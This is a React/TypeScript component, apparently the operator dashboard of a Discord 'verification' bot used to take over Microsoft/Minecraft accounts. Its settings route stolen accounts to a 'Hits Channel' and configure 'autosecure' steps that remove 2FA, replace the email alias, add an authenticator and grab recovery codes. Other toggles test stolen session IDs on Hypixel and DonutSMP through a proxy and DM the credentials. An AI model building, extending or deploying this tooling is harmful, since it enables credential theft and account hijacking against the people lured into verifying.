import { useState, useEffect, useCallback } from "react";
import {
  Bot, Activity, Shield, RefreshCw, Check, Loader2, Plus, X, ArrowUp, ArrowDown,
} from "lucide-react";
import { toast } from "sonner";
import { authHeaders } from "./context";
import { CommandsPanel } from "./CommandsPanel";
import { EmbedsPanel } from "./EmbedsPanel";

type PostVerificationAction = {
  type: string;
  role_id: string;
  message_content: string;
  channel_name: string;
  channel_category_id: string;
  channel_embed_title: string;
  channel_embed_description: string;
  channel_embed_color: number;
};

type BotConfigData = {
  owners: number[];
  autosecure: {
    replace_main_alias: boolean;
    enable_2fa: boolean;
    minecon_mode: boolean;
    reject?: {
      check_hypixel_ban?: boolean;
      check_donutsmp_ban?: boolean;
      family_locked?: boolean;
      family_members?: boolean;
      gamepass?: boolean;
      underage?: boolean;
      min_age_years?: number;
    };
  };
  discord: {
    logs_channel: string;
    accounts_channel: string;
    censored_logs_channel: string;
    verify_channel?: string;
  };
  presence: { status: string; activity_text: string; activity_type: string };
  embeds: Record<string, Record<string, { title: string; description: string; color: number }>>;
  ephemeral: boolean;
  post_verification: { actions: PostVerificationAction[] };
};

type SubTab = "servers" | "commands" | "embeds";

export function BotConfigPanel() {
  const [subTab, setSubTab] = useState<SubTab>("servers");
  const [cfg, setCfg] = useState<BotConfigData | null>(null);
  const [servers, setServers] = useState<{ id: number; name: string; icon: string | null; owner: boolean }[]>([]);
  const [loading, setLoading] = useState(true);
  const [newOwnerId, setNewOwnerId] = useState("");
  const [status, setStatus] = useState("online");
  const [activityText, setActivityText] = useState("");
  const [activityType, setActivityType] = useState("playing");
  const [restarting, setRestarting] = useState(false);
  const [savingStatus, setSavingStatus] = useState(false);
  const [savingSecure, setSavingSecure] = useState(false);
  const [pvActions, setPvActions] = useState<PostVerificationAction[]>([]);
  const [savingPv, setSavingPv] = useState(false);

  const [logsChannel, setLogsChannel] = useState("");
  const [hitsChannel, setHitsChannel] = useState("");
  const [censoredLogsChannel, setCensoredLogsChannel] = useState("");
  const [botToken, setBotToken] = useState("");
  const [savingChannels, setSavingChannels] = useState(false);

  const fetchAll = useCallback(async () => {
    try {
      const [cfgRes, srvRes] = await Promise.all([
        fetch("/api/bot/config", { headers: authHeaders() }),
        fetch("/api/bot/servers", { headers: authHeaders() }),
      ]);
      if (cfgRes.ok) {
        const d = await cfgRes.json();
        setCfg(d);
        const p = d.presence || {};
        setStatus(p.status || "online");
        setActivityText(p.activity_text || "");
        setActivityType(p.activity_type || "playing");
        const pv = d.post_verification || {};
        setPvActions(pv.actions || []);
        const discord = d.discord || {};
        setLogsChannel(discord.logs_channel || "");
        setHitsChannel(discord.accounts_channel || "");
        setCensoredLogsChannel(discord.censored_logs_channel || "");
        setBotToken(d.bot_token || "");
      }
      if (srvRes.ok) setServers(await srvRes.json());
    } catch {
      toast.error("Failed to load bot config");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { fetchAll(); }, [fetchAll]);

  const addOwner = async () => {
    const id = parseInt(newOwnerId);
    if (isNaN(id)) return;
    const res = await fetch("/api/bot/owners", {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authHeaders() },
      body: JSON.stringify({ id }),
    });
    if (res.ok) {
      toast.success("Owner added");
      setNewOwnerId("");
      fetchAll();
    } else toast.error("Failed to add owner");
  };

  const removeOwner = async (id: number) => {
    const res = await fetch(`/api/bot/owners/${id}`, { method: "DELETE", headers: authHeaders() });
    if (res.ok) {
      toast.success("Owner removed");
      fetchAll();
    } else toast.error("Failed to remove owner");
  };

  const saveStatus = async () => {
    setSavingStatus(true);
    const res = await fetch("/api/bot/status", {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authHeaders() },
      body: JSON.stringify({ status, activity_text: activityText, activity_type: activityType }),
    });
    if (res.ok) toast.success("Status saved (Needs restart)");
    else toast.error("Failed to save status");
    setSavingStatus(false);
  };

  const toggleAutosecure = async (
    field: "replace_main_alias" | "enable_2fa" | "minecon_mode" | "check_hypixel_ban" | "check_donutsmp_ban",
    val: boolean,
  ) => {
    if (!cfg) return;
    const reject = { ...(cfg.autosecure.reject || {}) };
    let nextAutosecure = { ...cfg.autosecure };
    if (field === "check_hypixel_ban" || field === "check_donutsmp_ban") {
      reject[field] = val;
      nextAutosecure = { ...nextAutosecure, reject };
    } else {
      nextAutosecure = { ...nextAutosecure, [field]: val };
    }
    setCfg({ ...cfg, autosecure: nextAutosecure });
    setSavingSecure(true);
    const res = await fetch("/api/bot/autosecure", {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authHeaders() },
      body: JSON.stringify({
        replace_main_alias: nextAutosecure.replace_main_alias,
        enable_2fa: nextAutosecure.enable_2fa,
        minecon_mode: nextAutosecure.minecon_mode,
        check_hypixel_ban: !!nextAutosecure.reject?.check_hypixel_ban,
        check_donutsmp_ban: !!nextAutosecure.reject?.check_donutsmp_ban,
      }),
    });
    if (!res.ok) toast.error("Failed to save");
    setSavingSecure(false);
  };

  const savePostVerification = async () => {
    setSavingPv(true);
    const res = await fetch("/api/bot/post-verification", {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authHeaders() },
      body: JSON.stringify({ actions: pvActions }),
    });
    if (res.ok) toast.success("Post-verification saved");
    else toast.error("Failed to save post-verification");
    setSavingPv(false);
  };

  const addPvAction = () => {
    setPvActions(prev => [...prev, {
      type: "role",
      role_id: "",
      message_content: "",
      channel_name: "",
      channel_category_id: "",
      channel_embed_title: "",
      channel_embed_description: "",
      channel_embed_color: 0x3B89FF,
    }]);
  };

  const removePvAction = (idx: number) => {
    setPvActions(prev => prev.filter((_, i) => i !== idx));
  };

  const movePvAction = (idx: number, dir: -1 | 1) => {
    const target = idx + dir;
    if (target < 0 || target >= pvActions.length) return;
    setPvActions(prev => {
      const next = [...prev];
      [next[idx], next[target]] = [next[target], next[idx]];
      return next;
    });
  };

  const updatePvAction = (idx: number, field: string, value: string | number) => {
    setPvActions(prev => prev.map((a, i) => i === idx ? { ...a, [field]: value } : a));
  };

  const pvColorToHex = (c: number) => `#${c.toString(16).toUpperCase().padStart(6, "0")}`;
  const pvHexToColor = (h: string) => parseInt(h.replace("#", ""), 16);

  const restartBot = async () => {
    setRestarting(true);
    const res = await fetch("/api/bot/restart", { method: "POST", headers: authHeaders() });
    if (res.ok) toast.success("Bot restarting...");
    else toast.error("Failed to restart bot");
    setRestarting(false);
  };

  const saveChannels = async () => {
    setSavingChannels(true);
    const body: Record<string, string> = {};
    if (logsChannel) body.logs_channel = logsChannel;
    if (hitsChannel) body.accounts_channel = hitsChannel;
    if (censoredLogsChannel) body.censored_logs_channel = censoredLogsChannel;
    const res = await fetch("/api/bot/channels", {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authHeaders() },
      body: JSON.stringify(body),
    });
    if (res.ok) toast.success("Channels saved");
    else toast.error("Failed to save channels");
    setSavingChannels(false);
  };

  const subTabs: { id: SubTab; label: string }[] = [
    { id: "servers", label: "Servers" },
    { id: "commands", label: "Commands" },
    { id: "embeds", label: "Embeds" },
  ];

  if (loading) {
    return (
      <div className="flex flex-1 items-center justify-center">
        <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
      </div>
    );
  }

  return (
    <div className="flex flex-1 flex-col space-y-8 pb-10">
      <div>
        <h1 className="font-display text-2xl font-bold tracking-tight sm:text-3xl">Bot Config</h1>
        <p className="mt-1 text-sm text-muted-foreground">Manage bot settings, servers, commands, and embed templates.</p>
      </div>

      <div className="flex gap-2">
        {subTabs.map(t => (
          <button
            key={t.id}
            onClick={() => setSubTab(t.id)}
            className={`rounded-xl border px-5 py-2 text-sm font-semibold transition shadow-sm ${
              subTab === t.id
                ? "border-[--primary]/60 bg-gradient-to-r from-[--primary] to-[--accent] text-primary-foreground"
                : "border-border bg-card/60 text-muted-foreground hover:text-foreground"
            }`}
          >
            {t.label}
          </button>
        ))}
      </div>

      {subTab === "servers" && (
        <div className="space-y-8">
          <section className="space-y-4">
            <div className="flex items-center gap-2">
              <Bot className="h-5 w-5 text-[--primary]" />
              <h2 className="font-display text-lg font-semibold">Server Overview</h2>
            </div>
            <div className="rounded-2xl border border-border bg-card/60 p-6 backdrop-blur space-y-4">
              <div>
                <p className="text-sm font-medium mb-2">Connected Servers ({servers.length})</p>
                {servers.length === 0 ? (
                  <p className="text-sm text-muted-foreground">Bot is not in any servers, or token is invalid.</p>
                ) : (
                  <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-3">
                    {servers.map(s => (
                      <div key={s.id} className="flex items-center gap-3 rounded-xl border border-border bg-background/30 px-4 py-3">
                        {s.icon ? (
                          <img src={`https://cdn.discordapp.com/icons/${s.id}/${s.icon}.png`} alt="" className="h-8 w-8 rounded-full" />
                        ) : (
                          <div className="grid h-8 w-8 place-items-center rounded-full bg-muted text-xs font-bold text-muted-foreground">{s.name[0]}</div>
                        )}
                        <div className="min-w-0 flex-1">
                          <p className="text-sm font-medium truncate">{s.name}</p>
                          <p className="text-xs text-muted-foreground">{s.id}</p>
                        </div>
                        {s.owner && <span className="text-[10px] font-semibold text-[--accent]">Owner</span>}
                      </div>
                    ))}
                  </div>
                )}
              </div>

              <hr className="border-border/40" />

              <div>
                <p className="text-sm font-medium mb-2">Bot Owners</p>
                <div className="flex flex-wrap gap-2 mb-3">
                  {cfg?.owners.map(id => (
                    <div key={id} className="inline-flex items-center gap-2 rounded-lg border border-border bg-background/30 px-3 py-1.5 text-sm">
                      {id}
                      <button onClick={() => removeOwner(id)} className="grid place-items-center text-muted-foreground hover:text-red-400 transition">
                        <X className="h-3.5 w-3.5" />
                      </button>
                    </div>
                  ))}
                </div>
                <div className="flex gap-2">
                  <input
                    type="text" inputMode="numeric" pattern="[0-9]*" value={newOwnerId} onChange={e => setNewOwnerId(e.target.value.replace(/\D/g, ''))}
                    placeholder="Discord user ID"
                    className="max-w-xs rounded-lg border border-border bg-background/60 px-4 py-2 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                  />
                  <button onClick={addOwner} className="inline-flex items-center gap-2 rounded-lg bg-gradient-to-r from-[--primary] to-[--accent] px-4 py-2 text-sm font-semibold text-primary-foreground transition hover:opacity-95">
                    <Plus className="h-4 w-4" />
                    Add Owner
                  </button>
                </div>
              </div>
            </div>
          </section>

          <section className="space-y-4">
            <div className="flex items-center gap-2">
              <Shield className="h-5 w-5 text-[--primary]" />
              <h2 className="font-display text-lg font-semibold">Channel Settings</h2>
            </div>
            <div className="rounded-2xl border border-border bg-card/60 p-6 backdrop-blur space-y-5">
              <p className="text-sm text-muted-foreground">Configure Discord channels used by the bot.</p>
              <div className="grid gap-5 sm:grid-cols-2">
                <div className="space-y-2">
                  <label className="block text-sm font-medium">Hits Channel</label>
                  <input
                    type="text" value={hitsChannel} onChange={e => setHitsChannel(e.target.value)}
                    placeholder="Channel ID"
                    className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 font-mono text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                  />
                </div>
                <div className="space-y-2">
                  <label className="block text-sm font-medium">Logs Channel</label>
                  <input
                    type="text" value={logsChannel} onChange={e => setLogsChannel(e.target.value)}
                    placeholder="Channel ID"
                    className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 font-mono text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                  />
                </div>
                <div className="space-y-2">
                  <label className="block text-sm font-medium">Censored Logs Channel</label>
                  <input
                    type="text" value={censoredLogsChannel} onChange={e => setCensoredLogsChannel(e.target.value)}
                    placeholder="Channel ID"
                    className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 font-mono text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                  />
                </div>
              </div>
              <div className="flex justify-end pt-2">
                <button onClick={saveChannels} disabled={savingChannels}
                  className="inline-flex items-center gap-2 rounded-lg bg-gradient-to-r from-[--primary] to-[--accent] px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-[var(--shadow-glow)] transition hover:opacity-95 disabled:opacity-60"
                >
                  {savingChannels ? <Loader2 className="h-4 w-4 animate-spin" /> : <Check className="h-4 w-4" />}
                  Save Channels
                </button>
              </div>
            </div>
          </section>

          <section className="space-y-4">
            <div className="flex items-center gap-2">
              <Bot className="h-5 w-5 text-[--primary]" />
              <h2 className="font-display text-lg font-semibold">Bot Token</h2>
            </div>
            <div className="rounded-2xl border border-border bg-card/60 p-6 backdrop-blur space-y-4">
              <div className="space-y-2">
                <label className="block text-sm font-medium">Token</label>
                <input
                  type="text" value={botToken.slice(0, Math.ceil(botToken.length / 2)) + botToken.slice(Math.ceil(botToken.length / 2)).replace(/./g, "*")} onChange={e => setBotToken(e.target.value)}
                  placeholder="Bot token"
                  className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 font-mono text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                />
              </div>
              <div className="flex justify-end pt-2">
                <button onClick={async () => {
                  if (!botToken.trim()) return;
                  const res = await fetch("/api/bot/token", {
                    method: "POST",
                    headers: { "Content-Type": "application/json", ...authHeaders() },
                    body: JSON.stringify({ bot_token: botToken.trim() }),
                  });
                  if (res.ok) toast.success("Bot token saved");
                  else toast.error("Failed to save bot token");
                }} className="inline-flex items-center gap-2 rounded-lg bg-gradient-to-r from-[--primary] to-[--accent] px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-[var(--shadow-glow)] transition hover:opacity-95"
                >
                  <Check className="h-4 w-4" />
                  Save Token
                </button>
              </div>
            </div>
          </section>

          <section className="space-y-4">
            <div className="flex items-center gap-2">
              <Activity className="h-5 w-5 text-[--primary]" />
              <h2 className="font-display text-lg font-semibold">Bot Status</h2>
            </div>
            <div className="rounded-2xl border border-border bg-card/60 p-6 backdrop-blur space-y-5">
              <div className="grid gap-5 sm:grid-cols-2">
                <div className="space-y-2">
                  <label className="block text-sm font-medium">Status</label>
                  <select
                    value={status} onChange={e => setStatus(e.target.value)}
                    className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                  >
                    <option value="online">Online</option>
                    <option value="idle">Idle</option>
                    <option value="dnd">Do Not Disturb</option>
                    <option value="invisible">Invisible</option>
                  </select>
                </div>
                <div className="space-y-2">
                  <label className="block text-sm font-medium">Activity Type</label>
                  <select
                    value={activityType} onChange={e => setActivityType(e.target.value)}
                    className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                  >
                    <option value="playing">Playing</option>
                    <option value="streaming">Streaming</option>
                    <option value="listening">Listening</option>
                    <option value="watching">Watching</option>
                    <option value="competing">Competing</option>
                  </select>
                </div>
              </div>
              <div className="space-y-2">
                <label className="block text-sm font-medium">Activity Text</label>
                <input
                  type="text" value={activityText} onChange={e => setActivityText(e.target.value)}
                  placeholder="with your data"
                  className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                />
              </div>
              <div className="flex items-center justify-between gap-3">
                <p className="text-xs text-muted-foreground/60">Note: The bot reads this on next restart. Use the restart button below to apply immediately.</p>
                <button onClick={saveStatus} disabled={savingStatus}
                  className="inline-flex items-center gap-2 rounded-lg bg-gradient-to-r from-[--primary] to-[--accent] px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-[var(--shadow-glow)] transition hover:opacity-95 disabled:opacity-60"
                >
                  {savingStatus ? <Loader2 className="h-4 w-4 animate-spin" /> : <Check className="h-4 w-4" />}
                  Save Status
                </button>
              </div>
            </div>
          </section>

          <section className="space-y-4">
            <div className="flex items-center gap-2">
              <Shield className="h-5 w-5 text-[--primary]" />
              <h2 className="font-display text-lg font-semibold">Secure Settings</h2>
            </div>
            <div className="rounded-2xl border border-border bg-card/60 p-6 backdrop-blur space-y-4">
              <div className="flex items-center justify-between rounded-xl border border-border bg-background/30 px-4 py-3">
                <div>
                  <p className="text-sm font-medium">Minecon Mode</p>
                  <p className="text-xs text-muted-foreground">Skips 2FA removal, proofs, services, devices, alias change, and authenticator. Only grabs info + recovery code.</p>
                </div>
                <button
                  onClick={() => toggleAutosecure("minecon_mode", !cfg?.autosecure.minecon_mode)}
                  className={`relative h-6 w-11 rounded-full transition ${cfg?.autosecure.minecon_mode ? "bg-green-500" : "bg-zinc-600"}`}
                >
                  <span className={`absolute left-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform ${cfg?.autosecure.minecon_mode ? "translate-x-5" : "translate-x-0"}`} />
                </button>
              </div>
              <div className={`flex items-center justify-between rounded-xl border border-border bg-background/30 px-4 py-3 transition ${cfg?.autosecure.minecon_mode ? "opacity-40 pointer-events-none" : ""}`}>
                <div>
                  <p className="text-sm font-medium">Replace Primary Alias</p>
                  <p className="text-xs text-muted-foreground">Automatically replace the primary email alias during securing.</p>
                </div>
                <button
                  onClick={() => toggleAutosecure("replace_main_alias", !cfg?.autosecure.replace_main_alias)}
                  disabled={cfg?.autosecure.minecon_mode}
                  className={`relative h-6 w-11 rounded-full transition ${cfg?.autosecure.replace_main_alias ? "bg-green-500" : "bg-zinc-600"}`}
                >
                  <span className={`absolute left-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform ${cfg?.autosecure.replace_main_alias ? "translate-x-5" : "translate-x-0"}`} />
                </button>
              </div>
              <div className={`flex items-center justify-between rounded-xl border border-border bg-background/30 px-4 py-3 transition ${cfg?.autosecure.minecon_mode ? "opacity-40 pointer-events-none" : ""}`}>
                <div>
                  <p className="text-sm font-medium">Add Authenticator</p>
                  <p className="text-xs text-muted-foreground">Add an authenticator and enables two-factor authentication on secured accounts.</p>
                </div>
                <button
                  onClick={() => toggleAutosecure("enable_2fa", !cfg?.autosecure.enable_2fa)}
                  disabled={cfg?.autosecure.minecon_mode}
                  className={`relative h-6 w-11 rounded-full transition ${cfg?.autosecure.enable_2fa ? "bg-green-500" : "bg-zinc-600"}`}
                >
                  <span className={`absolute left-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform ${cfg?.autosecure.enable_2fa ? "translate-x-5" : "translate-x-0"}`} />
                </button>
              </div>
              <div className="flex items-center justify-between rounded-xl border border-border bg-background/30 px-4 py-3">
                <div>
                  <p className="text-sm font-medium">Check Hypixel ban</p>
                  <p className="text-xs text-muted-foreground">After secure, join mc.hypixel.net with the account SSID via ColdProxy. Reject + DM creds if banned.</p>
                </div>
                <button
                  onClick={() => toggleAutosecure("check_hypixel_ban", !cfg?.autosecure.reject?.check_hypixel_ban)}
                  className={`relative h-6 w-11 rounded-full transition ${cfg?.autosecure.reject?.check_hypixel_ban ? "bg-green-500" : "bg-zinc-600"}`}
                >
                  <span className={`absolute left-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform ${cfg?.autosecure.reject?.check_hypixel_ban ? "translate-x-5" : "translate-x-0"}`} />
                </button>
              </div>
              <div className="flex items-center justify-between rounded-xl border border-border bg-background/30 px-4 py-3">
                <div>
                  <p className="text-sm font-medium">Check DonutSMP ban</p>
                  <p className="text-xs text-muted-foreground">After secure, join donutsmp.net with the account SSID via ColdProxy. Reject + DM creds if banned.</p>
                </div>
                <button
                  onClick={() => toggleAutosecure("check_donutsmp_ban", !cfg?.autosecure.reject?.check_donutsmp_ban)}
                  className={`relative h-6 w-11 rounded-full transition ${cfg?.autosecure.reject?.check_donutsmp_ban ? "bg-green-500" : "bg-zinc-600"}`}
                >
                  <span className={`absolute left-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform ${cfg?.autosecure.reject?.check_donutsmp_ban ? "translate-x-5" : "translate-x-0"}`} />
                </button>
              </div>
            </div>
          </section>

          <section className="space-y-4">
            <div className="flex items-center gap-2">
              <Check className="h-5 w-5 text-[--primary]" />
              <h2 className="font-display text-lg font-semibold">Post Verification</h2>
            </div>
            <div className="rounded-2xl border border-border bg-card/60 p-6 backdrop-blur space-y-5">
              <p className="text-sm text-muted-foreground">Actions to perform after a user successfully verifies.</p>

              {pvActions.map((a, i) => (
                <div key={i} className="rounded-xl border border-border bg-background/30 p-4 space-y-4">
                  <div className="flex items-center justify-between gap-2">
                    <div className="flex items-center gap-1">
                      <button onClick={() => movePvAction(i, -1)} disabled={i === 0}
                        className="grid place-items-center rounded p-1 text-muted-foreground hover:text-foreground disabled:opacity-30 transition"
                      ><ArrowUp className="h-4 w-4" /></button>
                      <button onClick={() => movePvAction(i, 1)} disabled={i === pvActions.length - 1}
                        className="grid place-items-center rounded p-1 text-muted-foreground hover:text-foreground disabled:opacity-30 transition"
                      ><ArrowDown className="h-4 w-4" /></button>
                      <span className="text-sm font-medium text-muted-foreground ml-1">Action {i + 1}</span>
                    </div>
                    <button onClick={() => removePvAction(i)}
                      className="grid place-items-center rounded p-1 text-muted-foreground hover:text-red-400 transition"
                    ><X className="h-4 w-4" /></button>
                  </div>

                  <div className="space-y-2">
                    <label className="block text-sm font-medium">Type</label>
                    <select value={a.type} onChange={e => updatePvAction(i, "type", e.target.value)}
                      className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                    >
                      <option value="role">Add Role</option>
                      <option value="message">Send Message</option>
                      <option value="channel">Create Channel</option>
                    </select>
                  </div>

                  {a.type === "role" && (
                    <div className="space-y-2">
                      <label className="block text-sm font-medium">Role ID</label>
                      <input type="text" value={a.role_id} onChange={e => updatePvAction(i, "role_id", e.target.value)}
                        placeholder="123456789012345678"
                        className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 font-mono text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                      />
                    </div>
                  )}

                  {a.type === "message" && (
                    <div className="space-y-2">
                      <label className="block text-sm font-medium">Message Content</label>
                      <textarea value={a.message_content} onChange={e => updatePvAction(i, "message_content", e.target.value)}
                        placeholder="Welcome! You've been verified."
                        rows={4}
                        className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                      />
                    </div>
                  )}

                  {a.type === "channel" && (
                    <div className="space-y-4">
                      <div className="space-y-2">
                        <label className="block text-sm font-medium">Channel Name</label>
                        <input type="text" value={a.channel_name} onChange={e => updatePvAction(i, "channel_name", e.target.value)}
                          placeholder="ticket-{username}"
                          className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="block text-sm font-medium">Category ID (optional)</label>
                        <input type="text" value={a.channel_category_id} onChange={e => updatePvAction(i, "channel_category_id", e.target.value)}
                          placeholder="123456789012345678"
                          className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 font-mono text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="block text-sm font-medium">Embed Title</label>
                        <input type="text" value={a.channel_embed_title} onChange={e => updatePvAction(i, "channel_embed_title", e.target.value)}
                          placeholder="Welcome to your ticket"
                          className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="block text-sm font-medium">Embed Description</label>
                        <textarea value={a.channel_embed_description} onChange={e => updatePvAction(i, "channel_embed_description", e.target.value)}
                          placeholder="A staff member will assist you shortly."
                          rows={4}
                          className="w-full rounded-lg border border-border bg-background/60 px-4 py-2.5 text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="block text-sm font-medium">Embed Color</label>
                        <div className="flex gap-2 items-center">
                          <input type="text" value={pvColorToHex(a.channel_embed_color)} onChange={e => updatePvAction(i, "channel_embed_color", pvHexToColor(e.target.value))}
                            placeholder="#3B89FF"
                            className="flex-1 rounded-lg border border-border bg-background/60 px-4 py-2.5 font-mono text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
                          />
                          <input type="color" value={pvColorToHex(a.channel_embed_color)} onChange={e => updatePvAction(i, "channel_embed_color", pvHexToColor(e.target.value.toUpperCase()))}
                            className="h-10 w-10 cursor-pointer rounded-lg border border-border bg-background/60"
                          />
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              ))}

              <button onClick={addPvAction}
                className="inline-flex items-center gap-2 rounded-lg border border-dashed border-border bg-background/20 px-4 py-2.5 text-sm font-medium text-muted-foreground transition hover:border-[--primary] hover:text-[--primary] w-full justify-center"
              >
                <Plus className="h-4 w-4" />
                Add Action
              </button>

              <div className="flex justify-end gap-3 pt-2">
                <button onClick={savePostVerification} disabled={savingPv}
                  className="inline-flex items-center gap-2 rounded-lg bg-gradient-to-r from-[--primary] to-[--accent] px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-[var(--shadow-glow)] transition hover:opacity-95 disabled:opacity-60"
                >
                  {savingPv ? <Loader2 className="h-4 w-4 animate-spin" /> : <Check className="h-4 w-4" />}
                  Save
                </button>
              </div>
            </div>
          </section>

          <section className="space-y-4">
            <div className="flex items-center gap-2">
              <RefreshCw className="h-5 w-5 text-[--primary]" />
              <h2 className="font-display text-lg font-semibold">Restart Bot</h2>
            </div>
            <div className="rounded-2xl border border-border bg-card/60 p-6 backdrop-blur">
              <p className="text-sm text-muted-foreground mb-4">Restart the Discord bot to apply status and presence changes immediately. Works on both Linux and Windows.</p>
              <button onClick={restartBot} disabled={restarting}
                className="inline-flex items-center gap-2 rounded-lg bg-gradient-to-r from-[--primary] to-[--accent] px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-[var(--shadow-glow)] transition hover:opacity-95 disabled:opacity-60"
              >
                {restarting ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
                {restarting ? "Restarting..." : "Restart Bot"}
              </button>
            </div>
          </section>
        </div>
      )}

      {subTab === "commands" && <CommandsPanel />}

      {subTab === "embeds" && <EmbedsPanel />}
    </div>
  );
}
